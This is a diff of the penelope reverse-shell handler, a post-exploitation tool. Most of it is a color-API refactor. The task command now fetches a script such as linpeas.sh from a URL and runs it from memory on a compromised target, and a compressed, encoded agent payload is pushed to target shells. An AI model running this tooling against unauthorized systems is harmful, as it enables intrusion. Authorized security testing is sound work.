@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.9.1"
+__version__ = "0.9.2"
 
 import os
 import io
@@ -90,8 +90,7 @@ class MainMenu(cmd.Cmd):
 		active_sessions = len(core.sessions)
 		if active_sessions:
 			s = "s" if active_sessions > 1 else ""
-			return paint(f" ({active_sessions} active session{s})", 'red')\
-			+ paint('', 'yellow')
+			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
 		return ""
 
 	@staticmethod
@@ -104,7 +103,7 @@ class MainMenu(cmd.Cmd):
 	def confirm(text):
 		try:
 			__class__.set_auto_history(False)
-			answer = input(f"\r{paint(f'[?] {text} (y/N): ', 'yellow')}")
+			answer = input(f"\r{paint(f'[?] {text} (y/N): ').yellow}")
 			__class__.set_auto_history(True)
 			return answer.lower() == 'y'
 
@@ -140,9 +139,9 @@ class MainMenu(cmd.Cmd):
 
 	def set_id(self, ID):
 		self.sid = ID
-		session_part = f"{paint('Session', 'green')} {paint('['+str(self.sid), 'red')}{paint(']', 'red')} "\
+		session_part = f"{paint('Session').green} {paint('[' + str(self.sid) + ']').red} "\
 				if self.sid else ''
-		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑', 'magenta')} {session_part}> "
+		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑').magenta} {session_part}> "
 
 	def session(current=False, extra=[]):
 		def inner(func):
@@ -185,7 +184,7 @@ class MainMenu(cmd.Cmd):
 	def show_help(self, command):
 		help_prompt = re.compile("Run 'help [^\']*' for more information")
 		parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
-		print("\n", paint(command, 'green'), paint(parts[1], 'blue', reset=True), "\n")
+		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
 		modified_parts = []
 		for part in parts[2:]:
 			part = help_prompt.sub('', part)
@@ -202,29 +201,31 @@ class MainMenu(cmd.Cmd):
 
 		Examples:
 
-			help			Show all commands at a glance
-			help interact		Show extensive information about a command
+			help		Show all commands at a glance
+			help interact	Show extensive information about a command
 			help -a		Show extensive information for all commands
 		"""
 		if command:
 			if command == "-a":
 				for section in self.commands:
-					print(f'\n{section}\n{"="*len(section)}')
+					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
 					for command in self.commands[section]:
 						self.show_help(command)
 			else:
 				if command in self.raw_commands:
 					self.show_help(command)
 				else:
-					cmdlogger.warning(f"No such command: '{command}'. "
-					f"Issue 'help' for all available commands")
+					cmdlogger.warning(
+						f"No such command: '{command}'. "
+						f"Issue 'help' for all available commands"
+					)
 		else:
 			for section in self.commands:
-				print(f'\n{section}\n{"="*len(section)}')
+				print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
 				table = Table(joinchar=' · ')
 				for command in self.commands[section]:
 					parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
-					table += [paint(command, 'green'), paint(parts[0], 'blue', reset=True), parts[1]]
+					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
 				print(table)
 			print()
 
@@ -343,9 +344,11 @@ class MainMenu(cmd.Cmd):
 				items.extend(core.sessions[self.sid].download(item_path))
 
 			if len(items) > options.max_open_files:
-				cmdlogger.warning(f"More than {options.max_open_files} items selected"
-						f" for opening. The open list is truncated to "
-						f"{options.max_open_files}.")
+				cmdlogger.warning(
+					f"More than {options.max_open_files} items selected"
+					f" for opening. The open list is truncated to "
+					f"{options.max_open_files}."
+				)
 				items = items[:options.max_open_files]
 
 			for item in items:
@@ -357,7 +360,7 @@ class MainMenu(cmd.Cmd):
 	def do_upload(self, local_globs):
 		"""
 		<glob|URL>...
-		Upload files / folders / HTTP(S)/FTP(S) URLs to the target. Run 'help upload' for more information
+		Upload files / folders / HTTP(S)/FTP(S) URLs to the target.
 		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
 		when the target has no Internet access
 
@@ -380,9 +383,9 @@ class MainMenu(cmd.Cmd):
 
 	def show_modules(self):
 		table = Table(joinchar=' <-> ')
-		table.header = [paint('MODULE NAME', 'cyan', 'UNDERLINE'), paint('DESCRIPTION', 'cyan', 'UNDERLINE')]
+		table.header = [paint('MODULE NAME').cyan_UNDERLINE, paint('DESCRIPTION').cyan_UNDERLINE]
 		for name, info in options.modules.items():
-			table += [paint(name, 'red'), info['description']]
+			table += [paint(name).red, info['description']]
 		print("\n", table, "\n", sep="")
 
 	@session(current=True)
@@ -403,7 +406,7 @@ class MainMenu(cmd.Cmd):
 	def do_spawn(self, line):
 		"""
 		[Port] [Host]
-		Spawn a new session. Run 'help spawn' for more information
+		Spawn a new session.
 
 		Examples:
 
@@ -453,14 +456,14 @@ class MainMenu(cmd.Cmd):
 			else:
 				cmdlogger.error("Invalid number")
 		else:
-			status = paint('Enabled', 'white', 'GREEN') if options.maintain >= 2 else paint('Disabled', 'white', 'RED')
-			cmdlogger.info(f"Value set to {paint(options.maintain, 'yellow')} {status}")
+			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
+			cmdlogger.info(f"Value set to {paint(options.maintain).yellow} {status}")
 
 	@session(current=True)
 	def do_upgrade(self, ID):
 		"""
 
-		Upgrade the current session's shell to PTY. Run 'help upgrade' for more information
+		Upgrade the current session's shell to PTY.
 		Note: By default this is automatically run on the new sessions. Disable it with -U
 		"""
 		core.sessions[self.sid].upgrade()
@@ -492,18 +495,22 @@ class MainMenu(cmd.Cmd):
 	@session(current=True)
 	def do_task(self, cmdline):
 		"""
-		<remote command>
-		Execute a remote command in the background and get the output in a local file
+		<local_script|URL>
+		Execute a local script or URL from memory in the target and get the output in a local file
 
 		Examples:
-			task ./linpeas.sh
+			task https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 		"""
 		if cmdline:
-			task = core.sessions[self.sid].task(cmdline)
-			print(paint("Run the below command to track its output:", 'blue'))
+			task = core.sessions[self.sid].task(cmdline, localscript=True)
+			if not task:
+				return False
+			#print(paint("Output monitoring command:").blue)
 			files = [file.name for file in task['streams'].values()]
 			for file in set(files):
-				print(f'tail -n+0 -f {file}')
+				tail = f'tail -n+0 -f {file}'
+				Open("-e", f'{tail}', terminal=True)
+				print(tail)
 		else:
 			cmdlogger.warning("No command to execute")
 
@@ -514,24 +521,24 @@ class MainMenu(cmd.Cmd):
 		Show assigned tasks
 		"""
 		table = Table(joinchar=' | ')
-		#table.header = [paint('TaskID', 'MAGENTA'), paint('Command', 'MAGENTA'), paint('Status', 'MAGENTA')]
-		table.header = ['SessionID', 'TaskID', 'Command', 'Output', 'Status']
+		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']
 
 		for sessionid in core.sessions:
 			tasks = core.sessions[sessionid].tasks
 			for taskid in tasks:
 				for stream in tasks[taskid]['streams'].values():
 					if stream.closed:
-						status = paint('Completed!', 'GREEN')
+						status = paint('Completed!').GREEN
 						break
 				else:
-					status = paint('Active...', 'YELLOW')
+					status = paint('Active...').YELLOW
 
 				table += [
-					paint(sessionid, 'red'),
-					paint(taskid, 'cyan'),
-					paint(tasks[taskid]['command'], 'yellow'),
-					paint(tasks[taskid]['streams']['1'].name, 'green'),
+					paint(sessionid).red,
+					paint(taskid).cyan,
+					paint(tasks[taskid]['pid']).blue,
+					paint(tasks[taskid]['command']).yellow,
+					paint(tasks[taskid]['streams']['1'].name).green,
 					status
 				]
 
@@ -627,7 +634,7 @@ class MainMenu(cmd.Cmd):
 		if core.listeners:
 			print()
 			for listener in core.listeners.values():
-				print(paint(f"{listener} hints:", 'cyan', 'UNDERLINE'))
+				print(paint(f"{listener} hints:").cyan_UNDERLINE)
 				print(listener.hints, end='\n\n')
 		else:
 			cmdlogger.warning("No registered Listeners to show hints")
@@ -689,8 +696,10 @@ class MainMenu(cmd.Cmd):
 		"""
 		__class__.write_history(options.cmd_histfile)
 		__class__.load_history(options.debug_histfile)
-		code.interact(banner=paint("===> Entering debugging console...", 'CYAN'), local=globals(),
-			exitmsg=paint("<=== Leaving debugging console...", 'CYAN'))
+		code.interact(banner=paint(
+			"===> Entering debugging console...").CYAN, local=globals(),
+			exitmsg=paint("<=== Leaving debugging console..."
+		).CYAN)
 		__class__.write_history(options.debug_histfile)
 		__class__.load_history(options.cmd_histfile)
 
@@ -706,11 +715,11 @@ class MainMenu(cmd.Cmd):
 			SET no_upgrade True	Set the no_upgrade option to True
 		"""
 		if not line:
-			rows = [ [paint(param, 'cyan'), paint(repr(getattr(options, param)), 'yellow')]
+			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
 					for param in options.__dict__ if param != 'modules' ]
-			table = Table(rows, fillchar=[paint('.', 'green'), 0], joinchar=' => ')
+			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
 			print(table)
-			print(f"{paint('modules', 'cyan')}\n{paint(json.dumps(getattr(options, 'modules'), indent=4), 'yellow')}")
+			print(f"{paint('modules').cyan}\n{paint(json.dumps(getattr(options, 'modules'), indent=4)).yellow}")
 		else:
 			try:
 				args = line.split(" ", 1)
@@ -719,13 +728,13 @@ class MainMenu(cmd.Cmd):
 					value = getattr(options, param)
 					if isinstance(value, (list, dict)):
 						value = json.dumps(value, indent=4)
-					print(f"{paint(value, 'yellow')}")
+					print(f"{paint(value).yellow}")
 				else:
 					new_value = eval(args[1])
 					old_value = getattr(options, param)
 					setattr(options, param, new_value)
 					if getattr(options, param) != old_value:
-						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param), 'yellow')}")
+						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")
 
 			except AttributeError:
 				cmdlogger.error("No such option")
@@ -744,8 +753,10 @@ class MainMenu(cmd.Cmd):
 			parts = line.split()
 			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
 			if not candidates:
-				cmdlogger.warning(f"No such command: '{line}'. "
-						f"Issue 'help' for all available commands")
+				cmdlogger.warning(
+					f"No such command: '{line}'. "
+					f"Issue 'help' for all available commands"
+				)
 			elif len(candidates) == 1:
 				cmd = f"{candidates[0]} {' '.join(parts[1:])}"
 				print(f"\x1b[1A{self.prompt}{cmd}")
@@ -1024,7 +1035,7 @@ def Connect(host, port):
 
 	else:
 		if not core.started: core.start()
-		logger.info(f"Connected to {paint(host, 'blue')}:{paint(port, 'red')} 🎯")
+		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
 		session = Session(_socket, host, port)
 		if session:
 			return True
@@ -1081,8 +1092,7 @@ class Listener:
 		return self.socket.fileno()
 
 	def start(self):
-		logger.info(f"Listening for reverse shells on {paint(self.host, 'blue')}"
-			f" 🚪{paint(self.port, 'red')} ")
+		logger.info(f"Listening for reverse shells on {paint(self.host).blue} 🚪{paint(self.port).red} ")
 
 		self.socket.listen(5)
 
@@ -1137,8 +1147,8 @@ class Listener:
 			ips = [ip for ip in Interfaces().list.values()]
 
 		for ip in ips:
-			output.extend([preset.format(paint(ip, 'blue'),
-				paint(self.port, 'yellow', 'DIM')) for preset in presets])
+			output.extend([preset.format(paint(ip).blue,
+				paint(self.port).yellow_DIM) for preset in presets])
 
 		output.append("─" * len(max(output, key=len)))
 
@@ -1255,9 +1265,10 @@ class Session:
 			if self.name == core.session_wait_host:
 				core.session_wait.put(self.id)
 
-			logger.info(f"Got {self.source} shell from {OSes[self.OS]} "
-				f"{paint(self.name, 'white', 'RED')}{paint('', 'green')} 💀 - "
-				f"Assigned SessionID {paint('<'+str(self.id)+'>', 'yellow')}"
+			logger.info(
+				f"Got {self.source} shell from {OSes[self.OS]} "
+				f"{paint(self.name).white_RED}{paint().green} 💀 - "
+				f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
 			)
 
 			self.directory = options.basedir / self.name
@@ -1266,7 +1277,7 @@ class Session:
 				self.logpath = self.directory / f"{self.name}.log"
 				self.logfile = open(self.logpath, 'ab', buffering=0)
 				if not options.no_timestamps and not self.logpath.exists():
-					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ", 'magenta')).encode())
+					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ").magenta).encode())
 
 			self.maintain()
 
@@ -1306,30 +1317,32 @@ class Session:
 
 	def __str__(self):
 		if menu.sid == self.id:
-			ID = paint('[' + str(self.id) + ']', 'red')
+			ID = paint('[' + str(self.id) + ']').red
 
 		elif self.new:
-			ID = paint('<' + str(self.id) + '>', 'yellow', 'BLINK')
+			ID = paint('<' + str(self.id) + '>').yellow_BLINK
 
 		else:
-			ID = paint('(' + str(self.id) + ')', 'yellow')
+			ID = paint('(' + str(self.id) + ')').yellow
 
-		source = 'Reverse shell from ' + str(self.listener) if self.listener \
-			else f'Bind shell (port {self.port})'
+		source = 'Reverse shell from ' + str(self.listener) if self.listener else f'Bind shell (port {self.port})'
 
-		return (f"\n{paint('SessionID ', 'blue')}{ID}\n"
-			f"{paint('    └──── ', 'blue')}"
-			f"{paint('Host: ', 'green')}{paint(self.name, 'RED')}\n"
-			f"\t  {paint('Shell Type: ', 'green')}"
-			#f"{paint('Control', 'YELLOW') if self.control else self.type}\n"
-			f"{paint(self.type, 'CYAN') if not self.type == 'Basic' else self.type}\n"
-			f"\t  {paint('OS Family: ', 'green')}{self.OS}\n"
-			f"\t  {paint('Source: ', 'green')}{source}"
+		return (
+			f"\n{paint('SessionID ').blue}{ID}\n"
+			f"{paint('    └──── ').blue}"
+			f"{paint('Host: ').green}{paint(self.name).RED}\n"
+			f"\t  {paint('Shell Type: ').green}"
+			#f"{paint('Control').YELLOW if self.control else self.type}\n"
+			f"{paint(self.type).CYAN if not self.type == 'Basic' else self.type}\n"
+			f"\t  {paint('OS Family: ').green}{self.OS}\n"
+			f"\t  {paint('Source: ').green}{source}"
 		)
 
 	def __repr__(self):
-		return (f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
-			f"interactive={self.interactive}, echoing={self.echoing})")
+		return (
+			f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
+			f"interactive={self.interactive}, echoing={self.echoing})"
+		)
 
 	def fileno(self):
 		return self.socket.fileno()
@@ -1408,10 +1421,12 @@ class Session:
 				missing = [b for b in binaries if not self._bin[b].startswith("/")]
 
 				if missing:
-					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method", 'red')) 
-					response = self.exec(f'for bin in {" ".join(missing)}; do for dir in '
+					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red) 
+					response = self.exec(
+						f'for bin in {" ".join(missing)}; do for dir in '
 						f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
-						'test -f $_bin && break || unset _bin; done; echo $_bin; done')
+						'test -f $_bin && break || unset _bin; done; echo $_bin; done'
+					)
 					if response:
 						self._bin.update(dict(zip(missing, response.decode().splitlines())))
 
@@ -1419,7 +1434,7 @@ class Session:
 				self._bin[binary] = None
 
 			result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
-			logger.debug(f"Available binaries on target: \n{paint(result, 'red')}")
+			logger.debug(f"Available binaries on target: \n{paint(result).red}")
 
 		return self._bin
 
@@ -1450,7 +1465,7 @@ class Session:
 					self._tmp = False
 					logger.warning("Cannot find writable directory on target...")
 				else:
-					logger.debug(f"Available writable directory on target: {paint(self._tmp, 'RED')}")
+					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")
 
 			elif self.OS == "Windows":
 				self._tmp = "%TEMP%"
@@ -1485,12 +1500,12 @@ class Session:
 		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes
 
 		if not options.no_timestamps:
-			timestamp = datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ", 'magenta'))
+			timestamp = datetime.now().strftime(str(paint("%Y-%m-%d %H:%M:%S: ").magenta)) #TEMP
 			data = re.sub(rb'(\r\n|\r|\n|\v|\f)', rf'\1{timestamp}'.encode(), data)
 
 		try:
 			if _input:
-				self.logfile.write(bytes(paint('ISSUED ==>', 'GREEN')+' ', encoding='utf8'))
+				self.logfile.write(bytes(paint('ISSUED ==>').GREEN+' ', encoding='utf8'))
 
 			self.logfile.write(data)
 
@@ -1605,7 +1620,7 @@ class Session:
 
 			if self.agent and not agent_typing: # TODO environment will not be the same as shell
 				if cmd:
-					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode())) 
+					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode()))
 					return self.responses.get()
 				return None
 
@@ -1665,8 +1680,8 @@ class Session:
 						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
 						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)
 
-				logger.debug(f"\n\n{paint(f'Command for session {self.id}', 'YELLOW')}: {initial_cmd}")
-				logger.debug(f"{paint('Command sent', 'yellow')}: {cmd.decode()}")
+				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
+				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
 				if self.agent and agent_typing:
 					cmd = Messenger.message(Messenger.SHELL, cmd)
 				self.send(cmd)
@@ -1683,7 +1698,7 @@ class Session:
 			need_check = False
 			while self.subchannel.result is None:
 
-				logger.debug(paint(f"Waiting for data (timeout={timeout})...", 'blue'))
+				logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
 				readables, _, _ = select.select([self.subchannel.control, self.subchannel], [], [], timeout)
 
 				if self.subchannel.control in readables:
@@ -1707,7 +1722,7 @@ class Session:
 
 					data = self.subchannel.read()
 					buffer.write(data)
-					logger.debug(f"{paint('Received', 'GREEN')} -> {data}")
+					logger.debug(f"{paint('Received').GREEN} -> {data}")
 
 					if timeout == data_timeout:
 						timeout = continuation_timeout
@@ -1715,7 +1730,7 @@ class Session:
 
 				else:
 					if timeout == data_timeout:
-						logger.debug(paint("TIMEOUT", 'RED'))
+						logger.debug(paint("TIMEOUT").RED)
 						self.subchannel.result = False
 						break
 					else:
@@ -1736,38 +1751,43 @@ class Session:
 					if not raw:
 						check = self.subchannel.pattern.search(buffer.getvalue())
 						if check:
-							logger.debug(paint('Got all data!', 'green'))
+							logger.debug(paint('Got all data!').green)
 							self.subchannel.result = check[1]
 							break
-						logger.debug(paint('We didn\'t get all data; continue receiving', 'yellow'))
+						logger.debug(paint('We didn\'t get all data; continue receiving').yellow)
 
 					elif expect:
 						for item in expect:
 							if item in buffer.getvalue():
-								logger.debug(paint(f"The expected string {item} found in data", 'yellow'))
+								logger.debug(paint(f"The expected string {item} found in data").yellow)
 								self.subchannel.result = buffer.getvalue()
 								break
 						else:
-							logger.debug(paint('No expected strings found in data. Receive again...', 'yellow'))
+							logger.debug(paint('No expected strings found in data. Receive again...').yellow)
 
 					else:
-						logger.debug(paint('Maybe got all data !?', 'yellow'))
+						logger.debug(paint('Maybe got all data !?').yellow)
 						self.subchannel.result = buffer.getvalue()
 						break
 
 			_stop = time.perf_counter()
-			logger.debug(f"{paint('FINAL TIME: ', 'BLUE', 'white')}{_stop - _start}")
+			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")
 
 			if value and self.subchannel.result is not False:
 				self.subchannel.result = self.subchannel.result.rstrip().decode()
-			logger.debug(f"{paint('FINAL RESPONSE: ', 'BLUE', 'white')}{self.subchannel.result}")
+			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
 			self.subchannel.active = False
 
 			return self.subchannel.result
 
 	def need_binary(self, name, url):
-		options = f"\n  1) Upload {paint(url, 'blue')}{paint('', 'magenta')}\n  2) Upload local {name} binary\n  3) Specify remote {name} binary path\n  4) None of the above\n"
-		print(paint(options, 'magenta'))
+		options = (
+			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
+			f"\n  2) Upload local {name} binary"
+			f"\n  3) Specify remote {name} binary path"
+			f"\n  4) None of the above\n"
+		)
+		print(paint(options).magenta)
 		answer = ask("Select action")
 
 		if answer == "1":
@@ -1813,12 +1833,12 @@ class Session:
 		if self.OS == "Unix":
 			deploy_agent = False
 
-			shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
-			if not shell:
+			self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
+			if not self.shell:
 				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
 
-			socat_cmd = f"{{}} - exec:{shell},pty,stderr,setsid,sigint,sane;exit 0"
+			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
 
 			if self.bin['python3'] or self.bin['python']:
 				if self.bin['python3']:
@@ -1832,8 +1852,8 @@ class Session:
 				deploy_agent = True
 				payload = base64.b64encode( zlib.compress(
 					AGENT.format(
+					self.shell,
 					textwrap.indent(MESSENGER, "\t", lambda line: not line.startswith("class")),
-					shell,
 					_exec,
 					).encode())).decode()
 				cmd = (
@@ -1886,13 +1906,13 @@ class Session:
 
 				return False
 
-			response = self.exec(f'export TERM=xterm-256color; export SHELL={shell}; {cmd}', receive=not deploy_agent, raw=True)
+			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', receive=not deploy_agent, raw=True)
 			if not response and not deploy_agent:
 				logger.error("The shell became unresponsive. I am killing it...")
 				self.kill()
 				return False
 
-			logger.info(f"Shell upgraded successfully using {paint(_bin, 'yellow')}{paint('', 'green')}! 💪")
+			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")
 
 			self.type =		'PTY'
 			self.interactive =	 True
@@ -1971,14 +1991,13 @@ class Session:
 		core.rlist.append(sys.stdin)
 
 		logger.info(
-				f"Interacting with session {paint('['+str(self.id)+']', 'red')}"
-				f"{paint(', Shell Type:', 'green')} {paint(self.type, 'CYAN')}"
-				f"{paint(', Menu key:', 'green')} "
-				f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl+C', 'MAGENTA')} "
-			)
+			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
+			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
+			f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl-C').MAGENTA} "
+		)
 
 		if not options.no_log:
-			logger.info(f"{paint('Logging to ', 'green')}{paint(self.logpath, 'yellow', 'DIM')} 📜")
+			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")
 
 		os.write(sys.stdout.fileno(), bytes(self.last_lines))
 
@@ -2033,10 +2052,10 @@ class Session:
 		available_bytes = shutil.disk_usage(local_download_folder).free
 
 		if self.OS == 'Unix':
-			progress_bar = PBar(0, paint(f"[+] {paint('', 'blue')}--- ⇣ Downloading", 'green'), 35)
+			progress_bar = PBar(0, f"{paint('[+] ').green}{paint('--- ⇣ Downloading').blue}", 35)
 
 			try:
-				logger.info(paint('--- Remote packing...', 'blue'))
+				logger.info(paint('--- Remote packing...').blue)
 				if self.agent:
 					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
 					self.control_session.progress_recv_queue = queue.SimpleQueue()
@@ -2053,7 +2072,7 @@ class Session:
 
 					actual_size = int(self.responses.get())
 					if not actual_size:
-						self.responses.get()
+						self.responses.get() # just consume
 						return []
 				else:
 					cmd = f"du -bac {remote_item_path} 2>&1|tail -1|cut -f1"
@@ -2070,14 +2089,17 @@ class Session:
 						logger.error(error)
 					send_size = int(self.exec(f"stat --printf='%s' {temp}"))
 
-				logger.info(paint(f"--- Need to get {paint('', 'yellow', 'DIM')}{send_size:,}{paint('', reset=True)}{paint('', 'blue')}"
-					f" bytes... They will be {paint('', 'green', 'DIM')}{actual_size:,}{paint('', reset=True)}{paint('', 'blue')} when unpacked.", 'blue'))
+				logger.info(
+					f'{paint("--- Need to get ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
+					f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
+				)
 
 				# Check for local available space
 				need = actual_size - available_bytes
 				if need > 0:
 					logger.error("Not enough space to download")
-					logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', reset=True)}{paint('', 'blue')} more bytes...", 'blue'))
+					logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
+					self.responses.get() # just consume
 					return []
 
 				progress_bar.end = send_size
@@ -2087,7 +2109,6 @@ class Session:
 
 					data = io.BytesIO()
 					for offset in range(0, send_size, options.download_chunk_size):
-						#response = self.exec(f"tail -c+{offset + 1} {temp} | head -c{options.download_chunk_size}")
 						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
 						if response is False:
 							progress_bar.terminate()
@@ -2106,7 +2127,7 @@ class Session:
 
 					data = self.responses.get()
 
-				logger.info(paint('--- Local unpacking...', 'blue'))
+				logger.info(paint('--- Local unpacking...').blue)
 				if not data:
 					logger.error("Corrupted response")
 					return []
@@ -2138,7 +2159,7 @@ class Session:
 				specified = specified.intersection(downloaded)
 
 				for item in specified:
-					logger.info(f"Downloaded => {paint(shlex.quote(pathlink(item)), 'yellow')}") # PROBLEM with ../ TODO
+					logger.info(f"Downloaded => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
 
 				return specified
 
@@ -2147,7 +2168,7 @@ class Session:
 				return []
 
 		elif self.OS == 'Windows':
-			tempfile = f"{self.tmp}\\{rand(10)}.zip"
+			'''tempfile = f"{self.tmp}\\{rand(10)}.zip"
 
 			#cmd = f"certutil -encode {remote_item_path} {tempfile} > nul && type {tempfile} && del {tempfile}"
 			#data = base64.b64decode(b''.join(data.splitlines()[2:-1]))
@@ -2170,15 +2191,17 @@ class Session:
 					for item in zipdata.infolist():
 						item.filename = item.filename.replace('\\', '/')
 						newpath = Path(zipdata.extract(item, path=local_download_folder))
-						logger.info(f"Downloaded => {paint(shlex.quote(pathlink(newpath)), 'yellow')}")
+						logger.info(f"Downloaded => {paint(shlex.quote(pathlink(newpath))).yellow}")
 
 			except zipfile.BadZipFile:
 				logger.error("Invalid zip format")
 
 			except binascii.Error:
-				logger.error("The item does not exist or access is denied")
+				logger.error("The item does not exist or access is denied")'''
 
-	def upload(self, local_item_path, remote_path=None, randomize_fname=False):
+			logger.warning("Upload on Windows shells is not implemented yet")
+
+	def upload(self, local_item_path, remote_path=None, randomize_fname=False, pipe=None):
 
 		destination = remote_path if remote_path else self.cwd
 
@@ -2198,13 +2221,16 @@ class Session:
 			if re.match('(http|ftp)s?://', local_item_path, re.IGNORECASE):
 
 				# URLs with special treatment
-				local_item_path = re.sub("https://www.exploit-db.com/exploits/",
-						"https://www.exploit-db.com/download/", local_item_path)
+				local_item_path = re.sub(
+					"https://www.exploit-db.com/exploits/",
+					"https://www.exploit-db.com/download/",
+					local_item_path
+				)
 
 				req = urllib.request.Request(local_item_path, headers={'User-Agent':options.useragent})
 
 				try:
-					logger.info(paint(f"--- ⇣  Downloading {local_item_path}", 'blue'))
+					logger.info(paint(f"--- ⇣  Downloading {local_item_path}").blue)
 					response = urllib.request.urlopen(req, timeout=options.short_timeout)
 					filename = response.headers.get_filename()
 					items = [response.read()]
@@ -2222,7 +2248,11 @@ class Session:
 				logger.warning(f"No such file or directory: {shlex.quote(local_item_path)}")
 				return []
 
-			logger.info(paint("--- Local packing...", 'blue'))
+			if pipe and len(items) > 1:
+				logger.warning(f"Only one script at a time please...")
+				return []
+
+			logger.info(paint("--- Local packing...").blue)
 
 			altnames = []
 			for item in items:
@@ -2258,15 +2288,16 @@ class Session:
 			actual_size = sum([item.size for item in tar])
 			if not actual_size:
 				return []
-
 			tar.close()
 
-			data = data.getvalue() if self.agent else base64.b64encode(data.getvalue())
+			data.seek(0)
+			data = data.read() if self.agent else base64.b64encode(data.read())
 			send_size = len(data)
 
-			# TODO fix it a bit
-			logger.info(paint(f"--- Need to send {paint('', 'yellow', 'DIM')}{send_size:,}{paint('', reset=True)}{paint('', 'blue')} bytes..."
-				f" They will be {paint('', 'green', 'DIM')}{actual_size:,}{paint('', reset=True)}{paint('', 'blue')} when unpacked.", 'blue'))
+			logger.info(
+				f'{paint("--- Need to send ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
+				f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
+			)
 
 			# Check remote space
 			if self.agent:
@@ -2280,15 +2311,18 @@ class Session:
 
 			if need > 0:
 				logger.error("Not enough space on target")
-				logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}"
-					f"{need:,}{paint('', reset=True)}{paint('', 'blue')} more bytes...", 'blue'))
+				logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
 				return []
 
 			# Start Uploading
-			progress_bar = PBar(send_size, paint(f"[+] {paint('', 'blue')}--- ⇥  Uploading", 'green'), 35)
+			progress_bar = PBar(send_size, f"{paint('[+] ').green}{paint('--- ⇥  Uploading').blue}", 35)
 
 			if self.agent:
-				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{destination}')".encode()))
+				if pipe:
+					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"agent.pipe_name = '{pipe}'".encode()))
+				else:
+					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{destination}')".encode()))
+
 				self.control_session.progress_send_queue = queue.SimpleQueue()
 				self.send(Messenger.message(Messenger.UPLOAD, data))
 
@@ -2297,7 +2331,7 @@ class Session:
 					progress_bar.update(sent)
 				del self.control_session.progress_send_queue
 
-				logger.info(paint("--- Remote unpacking...", 'blue'))
+				logger.info(paint("--- Remote unpacking...").blue)
 				response = self.responses.get()
